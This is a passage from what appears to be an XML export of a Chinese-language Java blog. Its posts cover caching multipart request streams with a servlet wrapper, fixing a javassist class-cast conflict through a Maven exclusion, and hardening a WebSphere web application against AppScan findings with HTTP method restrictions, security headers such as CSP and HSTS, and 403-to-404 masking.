class="keyword">new</span> YZMultipartRequestWrapper(request);</span><br><span class="line">        ModuleUtils.getInstance().selectModule(request, getServletContext());</span><br><span class="line">        ModuleConfig config = getModuleConfig(request);</span><br><span class="line"></span><br><span class="line">        YZDelegatingRequestProcessor processor = getProcessorForModule(config);</span><br><span class="line">        <span class="keyword">if</span> (processor == <span class="keyword">null</span>) &#123;</span><br><span class="line">           processor = (YZDelegatingRequestProcessor) getRequestProcessor(config);</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        processor.process(wrapper, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">private</span> YZDelegatingRequestProcessor <span class="title">getProcessorForModule</span><span class="params">(ModuleConfig config)</span> </span>&#123;</span><br><span class="line">        String key = Globals.REQUEST_PROCESSOR_KEY + config.getPrefix();</span><br><span class="line">        <span class="keyword">return</span> (YZDelegatingRequestProcessor) getServletContext().getAttribute(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在web.xml中将对应struts的action换成自己实现的</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>action<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.yz.testweb.common.web.YZActionServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 其他配置略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 其他配置略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面发现一个参考链接后<br><a href="https://my.oschina.net/vernon/blog/363693">解决在Filter中读取Request中的流后, 然后再Control中读取不到的做法</a>根本不用这么麻烦。直接只要实现个Wrapper类就好了。所以有了最后的版本。</p><h2 id="使用继承自HttpServletRequestWrapper的Wrapper类，较通用"><a href="#使用继承自HttpServletRequestWrapper的Wrapper类，较通用" class="headerlink" title="使用继承自HttpServletRequestWrapper的Wrapper类，较通用"></a>使用继承自HttpServletRequestWrapper的Wrapper类，较通用</h2><p>因为项目中使用了apache的commoms-io.jar，所以直接使用了其中的IOUtils，可用其他方案替代复制流操作。代码仅作参考。java版本，servlet版本不同，实现的ServletInputStream，方法可能会有不同。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.testweb.common.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZMultipartRequestWrapper</span> <span class="keyword">extends</span> <span class="title">HttpServletRequestWrapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream cacheBytes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">YZMultipartRequestWrapper</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request);</span><br><span class="line">        cacheBytes = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        IOUtils.copy(<span class="keyword">super</span>.getInputStream(), cacheBytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletInputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CacheServletInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheServletInputStream</span> <span class="keyword">extends</span> <span class="title">ServletInputStream</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> ByteArrayInputStream bais;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">CacheServletInputStream</span><span class="params">()</span></span>&#123;</span><br><span class="line">            bais = <span class="keyword">new</span> ByteArrayInputStream(cacheBytes.toByteArray());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> bais.read();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.close();</span><br><span class="line">            bais.close();</span><br><span class="line">            cacheBytes.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BufferedReader <span class="title">getReader</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(getInputStream(),<span class="string">"UTF-8"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filter类中使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//判断为multipartRequest后使用</span></span><br><span class="line">    <span class="keyword">if</span>(req != <span class="keyword">null</span> &amp;&amp; req.getContentType() != <span class="keyword">null</span> &amp;&amp; req.getContentType().indexOf(<span class="string">"multipart/form-data"</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">    YZMultipartRequestWrapper reqWrapper = <span class="keyword">new</span> YZMultipartRequestWrapper(request);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    //中间进行其他操作-1.使用spring中的MultipartResolver</span></span><br><span class="line"><span class="comment">    MultipartResolver resolver = new CommonsMultipartResolver(wrapper.getSession().getServletContext());</span></span><br><span class="line"><span class="comment">    MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(wrapper);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    //中间进行其他操作-2.使用apache的commons.fileupload.jar</span></span><br><span class="line"><span class="comment">    DiskFileItemFactory factory = new DiskFileItemFactory();</span></span><br><span class="line"><span class="comment">    factory.setSizeThreshold(1024*1024*2); // 2M</span></span><br><span class="line"><span class="comment">    ServletFileUpload f = new ServletFileUpload(factory);</span></span><br><span class="line"><span class="comment">    List&lt;FileItem&gt; list = f.parseRequest(req);        </span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    //其他取值校验操作等</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line"></span><br><span class="line">    filterChain.doFilter(reqWrapper,response);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    filterChain.doFilter(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>stream</tag>
      </tags>
  </entry>
  <entry>
    <title>修复 $$_javassist_ cannot be cast to javassist.util.proxy.Proxy</title>
    <url>/2016/05/09/fix-javassist-cannot-be-cast-to-javassist-util-proxy-Proxy/</url>
    <content><![CDATA[<p>在程序中出现下面的错误：</p><p>$$<em>javassist</em> cannot be cast to javassist.util.proxy.Proxy</p><p>这是因为 javassist 引用了不同的办法。</p><p>从 POM 中可以看出来。</p><p>在 POM 中定义，取消 3.11 版本的引用。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的 exclusions 是排除包，因为 Struts2中有javassist，Hibernate 中也有javassist,所以如果要整合Hibernate，一定要排除掉Struts2中的javassist，否则就冲突了。</p><p><a href="https://www.ossez.com/archiver/tid-30321.html">原文链接</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>解决安全扫描Insecure HTTP Methods Enabled的问题</title>
    <url>/2015/12/01/fix-Insecure-HTTP-Methods-Enabled/</url>
    <content><![CDATA[<p>项目部署在IBM WebSphere Application Server，简称WAS，上。使用IBM Rational AppScan进行安全扫描，发现一堆漏洞。<br>找到一个同样Insecure HTTP Methods Enabled问题的解决方案，大神原文<a href="http://www.cnblogs.com/Mainz/archive/2012/11/19/2777679.html">摸这里</a>。</p><p>因为支持的http命令中包含DELETE、OPTIONS、PUT、HEAD和TRACE这五条命令。<br>下面解决WAS Insecure HTTP Methods Enabled，其他web server或者application server想必是一样的。</p><ul><li>Risk: It is possible to upload, modify or delete web pages, scripts and files on the web server</li><li>Causes: The web server or application server are configured in an insecure way</li><li>Fix: Disable WebDAV, or disallow unneeded HTTP methods</li></ul><p><img alt="Insecure HTTP Methods Enabled" data-src="Insecure-HTTP-Methods.png"></p><p>修改网站的web.xml添加下面的内容即可</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>DisableUnsecureHttpActions<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>DELETE<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>PUT<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>HEAD<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>TRACE<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>OPTIONS<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">role-name</span>&gt;</span>NotExistingRole<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">user-data-constraint</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transport-guarantee</span>&gt;</span>NONE<span class="tag">&lt;/<span class="name">transport-guarantee</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">user-data-constraint</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果有在web.xml中设置403的页面，如下，需要删除</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>403<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">location</span>&gt;</span>/WEB-INF/error/403.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用curl工具，测试链接试下。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v -X OPTIONS https://testurl --insecure</span><br></pre></td></tr></table></figure><p>比较重要：最好在之前检查WAS有无配置<code>Enable application security</code><br>如果在IBM WebSphere Application Server,WAS上没有生效的话，检查下WAS配置。看看<code>global security</code>下的<code>Enable application security</code>是否有被勾选，没有被勾选，请勾选，很重要很重要！<br><a href="http://stackoverflow.com/questions/5067917/websphere-security-constraint-in-web-xml-doesnt-work">http://stackoverflow.com/questions/5067917/websphere-security-constraint-in-web-xml-doesnt-work</a></p><p>相关IBM WAS配置<a href="https://www.ibm.com/support/knowledgecenter/SSAW57_8.5.5/com.ibm.websphere.wlp.doc/ae/twlp_sec_ws_basicauth.html">启用基本认证以访问 Web Service</a>，<a href="https://www.ibm.com/support/knowledgecenter/SSYJ99_8.5.0/migrate/mig_pre_src_tai.dita">验证是否启用了 WebSphere Application Server 信任关联拦截器</a></p><p>WAS手工卸载项目</p><p>(1) 删除war包：rm –rf /opt/IBM/WebSphere/AppServer/profiles/AppSrv01/installedApps/localhostNode01Cell/xxx_war.ear</p><p>(2) 删除对应的配置文件：rm –rf /opt/IBM/WebSphere/AppServer/profiles/AppSrv01/config/cells/localhostNode01Cell/applications/xxx_war.ear</p><p>/data/was/WebSphere/AppServer/profiles/AppSrv01/config/cells/dev01Node01Cell/blas/xxx_war.ear</p><p>/data/was/WebSphere/AppServer/profiles/AppSrv01/config/cells/dev01Node01Cell/cus/xxx_war.ear</p><p>删除serverindex.xml 中项目配置：</p><p>/data/was/WebSphere/AppServer/profiles/AppSrv01/config</p><p>find . -name serverindex.xml</p><p>./cells/dev01Node01Cell/nodes/dev01Node01/serverindex.xml</p><p>可以试试看</p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>安全</tag>
        <tag>AppScan</tag>
      </tags>
  </entry>
  <entry>
    <title>修正一些AppScan低等级风险漏洞</title>
    <url>/2017/02/27/fix-some-appscan-low-level-bugs/</url>
    <content><![CDATA[<h2 id="AppScan中的一些低等级风险的问题修正建议"><a href="#AppScan中的一些低等级风险的问题修正建议" class="headerlink" title="AppScan中的一些低等级风险的问题修正建议"></a>AppScan中的一些低等级风险的问题修正建议</h2><p>另外，关于安全<a href="https://github.com/FallibleInc/security-guide-for-developers">实用性开发人员安全须知</a></p><h3 id="未停用密码栏位的自动完成HTML属性"><a href="#未停用密码栏位的自动完成HTML属性" class="headerlink" title="未停用密码栏位的自动完成HTML属性"></a>未停用密码栏位的自动完成HTML属性</h3><p>将HTML中的<code>input</code>元素的<code>password</code>栏位补上<code>autocomplete</code>属性。默认为<code>on</code>，变更为<code>off</code>。PS:该栏位为HTML5新增HTML属性 <code>&lt;!DOCTYPE html&gt;</code>。</p><h3 id="遗漏”Content-Security-Policy”标头"><a href="#遗漏”Content-Security-Policy”标头" class="headerlink" title="遗漏”Content-Security-Policy”标头"></a>遗漏”Content-Security-Policy”标头</h3><p>配置CSP(Content-Security-Policy)，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。可简单使用，设置值为<code>default-src &#39;self&#39;</code>。<br>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。<br>关于<a href="http://yanzhe919.github.io/2017/02/27/content-security-policy/">CSP入门</a><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">原文-阮一峰</a></p><h3 id="遗漏”X-Content-Type-Options”标头"><a href="#遗漏”X-Content-Type-Options”标头" class="headerlink" title="遗漏”X-Content-Type-Options”标头"></a>遗漏”X-Content-Type-Options”标头</h3><p>配置X-Content-Type-Options，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。使用时，值设置为<code>nosniff</code>。</p><p>值得注意的是，当使用该HTTP标头时，浏览器会检查HTTP响应标头的Content-Type中的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME类型</a>。当类型不符时，将被拦截。例如<code>.png</code>如HTTP响应标头中的Content-Type不为<code>image/png</code>时，将显示失败。</p><h4 id="文件类型的分类"><a href="#文件类型的分类" class="headerlink" title="文件类型的分类"></a>文件类型的分类</h4><table><thead><tr><th>类型</th><th align="center">描述</th><th align="right">典型示例</th></tr></thead><tbody><tr><td>text</td><td align="center">表明文件是普通文本，理论上是可读的语言</td><td align="right">text/plain, text/html, text/css, text/javascript</td></tr><tr><td>image</td><td align="center">表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型</td><td align="right">image/gif, image/png, image/jpeg, image/bmp, image/webp,image/svg+xml(SVG矢量图)</td></tr><tr><td>audio</td><td align="center">表明是某种音频文件</td><td align="right">audio/midi, audio/mpeg, audio/webm, audio/ogg, audio/wav</td></tr><tr><td>video</td><td align="center">表明是某种视频文件</td><td align="right">video/webm, video/ogg</td></tr><tr><td>application</td><td align="center">表明是某种二进制数据</td><td align="right">application/octet-stream, application/pkcs12, application/vnd.mspowerpoint, application/xhtml+xml, application/xml, application/pdf</td></tr></tbody></table><h4 id="在web环境最常用的视频文件的格式"><a href="#在web环境最常用的视频文件的格式" class="headerlink" title="在web环境最常用的视频文件的格式"></a>在web环境最常用的视频文件的格式</h4><table><thead><tr><th>MIME 类型</th><th align="center">音频或视频类型</th></tr></thead><tbody><tr><td>audio/wave audio/wav audio/x-wav audio/x-pn-wav</td><td align="center">音频流媒体文件。一般支持PCM音频编码，其他解码器有限支持（如果有的话）。</td></tr><tr><td>audio/webm</td><td align="center">WebM 音频文件格式。Vorbis 和 Opus 是其最常用的解码器。</td></tr><tr><td>video/webm</td><td align="center">采用WebM视频文件格式的音视频文件。VP8 和 VP9是其最常用的视频解码器。Vorbis 和 Opus 是其最常用的音频解码器。</td></tr><tr><td>audio/ogg</td><td align="center">采用OGG多媒体文件格式的音频文件。 Vorbis 是这个多媒体文件格式最常用的音频解码器。</td></tr><tr><td>video/ogg</td><td align="center">采用OGG多媒体文件格式的音视频文件。常用的视频解码器是 Theora；音频解码器为Vorbis 。</td></tr><tr><td>application/ogg</td><td align="center">采用OGG多媒体文件格式的音视频文件。常用的视频解码器是 Theora；音频解码器为Vorbis 。</td></tr></tbody></table><h4 id="JavaScript的MIME类型"><a href="#JavaScript的MIME类型" class="headerlink" title="JavaScript的MIME类型"></a><strong>JavaScript的MIME类型</strong></h4><ul><li>application/ecmascript</li><li>application/javascript</li><li>application/x-ecmascript</li><li>application/x-javascript</li><li>text/ecmascript</li><li>text/javascript</li><li>text/javascript1.0</li><li>text/javascript1.1</li><li>text/javascript1.2</li><li>text/javascript1.3</li><li>text/javascript1.4</li><li>text/javascript1.5</li><li>text/jscript</li><li>text/livescript</li><li>text/x-ecmascript</li><li>text/x-javascript</li></ul><p>以下类型的MIME类型(带参或不带参数)禁止解释为脚本语言</p><ul><li>text/plain</li><li>text/xml</li><li>application/octet-stream</li><li>application/xml</li></ul><p>更详细的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types">MIME类型表</a></p><h3 id="遗漏”X-XSS-Protection”标头"><a href="#遗漏”X-XSS-Protection”标头" class="headerlink" title="遗漏”X-XSS-Protection”标头"></a>遗漏”X-XSS-Protection”标头</h3><p>配置X-XSS-Protection，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。使用时，值设置为<code>1</code>。</p><ul><li>X-XSS-Protection: 0 (禁用XSS过滤)</li><li>X-XSS-Protection: 1 (启用XSS过滤（一般默认在浏览器中）。如果检测到跨站脚本攻击，浏览器将消毒页面（删除不安全的部分）。)</li><li>X-XSS-Protection: 1; mode=block (启用XSS过滤。而非消毒的页面，如果在检测到攻击的浏览器将防止页面的呈现。)</li><li>X-XSS-Protection: 1; report=<reporting-uri>(Chromium only) (启用XSS过滤。如果检测到跨站脚本攻击，浏览器将消毒页面并报告违规。本品采用CSP的功能report-uri指令发送报告。)</reporting-uri></li></ul><h3 id="遗漏HTTP-Strict-Transport-Security标头"><a href="#遗漏HTTP-Strict-Transport-Security标头" class="headerlink" title="遗漏HTTP Strict-Transport-Security标头"></a>遗漏HTTP Strict-Transport-Security标头</h3><p><a href="https://zh.wikipedia.org/wiki/HTTP%E4%B8%A5%E6%A0%BC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8">HTTP严格传输安全</a>（英语：HTTP Strict Transport Security，缩写：HSTS）是一套由互联网工程任务组发布的互联网安全策略机制。网站可以选择使用HSTS策略，来让浏览器强制使用HTTPS与网站进行通信，以减少会话劫持风险。</p><p>配置HTTP Strict-Transport-Security，在HTTP标头中配置/<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>中配置。使用时，一般值设置为<code>max-age=31536000</code> (一年内有效)。</p><p>HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。服务器开启HSTS的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含<code>Strict-Transport-Security</code>字段。非加密传输时设置的HSTS字段无效。[3]<br>比如，<code>https://example.com/</code> 的响应头含有<code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>。这意味着两点：</p><ul><li>在接下来的一年（即31536000秒）中，浏览器只要向example.com或其子域名发送HTTP请求时，必须采用HTTPS来发起连接。比如，用户点击超链接或在地址栏输入 <code>http://www.example.com/</code> ，浏览器应当自动将 http 转写成 https，然后直接向 <code>https://www.example.com/</code> 发送请求。</li><li>在接下来的一年中，如果 example.com 服务器发送的TLS证书无效，用户不能忽略浏览器警告继续访问网站。</li></ul><p>HSTS 简单来说就是强制 HTTPS。这需要分两步，第一步是你的服务器声明愿意放弃HTTP强制所有访问为安全的HTTPS。第二步是向几大浏览器 提起申请。在没有正式接受之前只要用户第一次访问之后，浏览器还是会记住你的HSTS爱好并且之后都会强制 HTTPS 而不是由服务端通过301转向。第二步需要慎用，因为据说难以反悔。一般来说只进行第一步就可以了。</p><h1 id="max-age-记住的时长-单位是秒-31536000-1-年"><a href="#max-age-记住的时长-单位是秒-31536000-1-年" class="headerlink" title="max-age: 记住的时长, 单位是秒 (31536000 = 1 年)"></a>max-age: 记住的时长, 单位是秒 (31536000 = 1 年)</h1><h1 id="includeSubdomains-所有子域名都强制使用-https-访问-这个如果不确定千万别开。"><a href="#includeSubdomains-所有子域名都强制使用-https-访问-这个如果不确定千万别开。" class="headerlink" title="includeSubdomains: 所有子域名都强制使用 https 访问, 这个如果不确定千万别开。"></a>includeSubdomains: 所有子域名都强制使用 https 访问, 这个如果不确定千万别开。</h1><h1 id="preload-告诉浏览器可以预加载你的域名的-HSTS。"><a href="#preload-告诉浏览器可以预加载你的域名的-HSTS。" class="headerlink" title="preload: 告诉浏览器可以预加载你的域名的 HSTS。"></a>preload: 告诉浏览器可以预加载你的域名的 HSTS。</h1><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>HSTS可以用来抵御SSL剥离攻击。SSL剥离攻击是中间人攻击的一种，由Moxie Marlinspike于2009年发明。他在当年的黑帽大会上发表的题为“New Tricks For Defeating SSL In Practice”的演讲中将这种攻击方式公开。SSL剥离的实施方法是阻止浏览器与服务器创建HTTPS连接。它的前提是用户很少直接在地址栏输入https://，用户总是通过点击链接或3xx重定向，从HTTP页面进入HTTPS页面。所以攻击者可以在用户访问HTTP页面时替换所有https://开头的链接为http://，达到阻止HTTPS的目的。<br>HSTS可以很大程度上解决SSL剥离攻击，因为只要浏览器曾经与服务器创建过一次安全连接，之后浏览器会强制使用HTTPS，即使链接被换成了HTTP。<br>另外，如果中间人使用自己的自签名证书来进行攻击，浏览器会给出警告，但是许多用户会忽略警告。HSTS解决了这一问题，一旦服务器发送了HSTS字段，用户将不再允许忽略警告。</p><h4 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h4><p>用户首次访问某网站是不受HSTS保护的。这是因为首次访问时，浏览器还未收到HSTS，所以仍有可能通过明文HTTP来访问。解决这个不足目前有两种方案，一是浏览器预置HSTS域名列表，Google Chrome、Firefox、Internet Explorer和Microsoft Edge实现了这一方案。二是将HSTS信息加入到域名系统记录中。但这需要保证DNS的安全性，也就是需要部署域名系统安全扩展。截至2016年这一方案没有大规模部署。<br>由于HSTS会在一定时间后失效（有效期由max-age指定），所以浏览器是否强制HSTS策略取决于当前系统时间。部分操作系统经常通过网络时间协议更新系统时间，如Ubuntu每次连接网络时，OS X Lion每隔9分钟会自动连接时间服务器。攻击者可以通过伪造NTP信息，设置错误时间来绕过HSTS。解决方法是认证NTP信息，或者禁止NTP大幅度增减时间。比如Windows 8每7天更新一次时间，并且要求每次NTP设置的时间与当前时间不得超过15小时。</p><h4 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h4><ul><li>Chromium和Google Chrome从4.0.211.0版本开始支持HSTS</li><li>Firefox 4及以上版本</li><li>Opera 12及以上版本</li><li>Safari从OS X Mavericks起</li><li>Internet Explorer和Microsoft Edge从Windows 10开始支持</li></ul><h3 id="检查到隐藏目录-403禁止改为404不存在"><a href="#检查到隐藏目录-403禁止改为404不存在" class="headerlink" title="检查到隐藏目录(403禁止改为404不存在)"></a>检查到隐藏目录(403禁止改为404不存在)</h3><p>可以的话，将回应状态码[403 - 禁止] 改为[404 - 不存在]，这样会将网站目录模糊化，可以防止泄漏网站结构。</p><p>可以在filter过滤器中自写wrapper，重写sendError。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.test.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponseWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZHttpServletResponseWrapper</span> <span class="keyword">extends</span> <span class="title">HttpServletResponseWrapper</span></span>&#123;</span><br><span class="line">    HttpServletResponse _response;</span><br><span class="line">    HttpServletRequest _request;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">YZHttpServletResponseWrapper</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(response);</span><br><span class="line">        _response = response;</span><br><span class="line">        _request = request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendError</span><span class="params">(<span class="keyword">int</span> sc,String msg)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String path = _request.getServletPath() + _request.getPathInfo();</span><br><span class="line">        <span class="keyword">if</span>(sc == <span class="number">403</span> &amp;&amp; path != <span class="keyword">null</span>)&#123;</span><br><span class="line">            _response.sendError(<span class="number">404</span>,msg);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            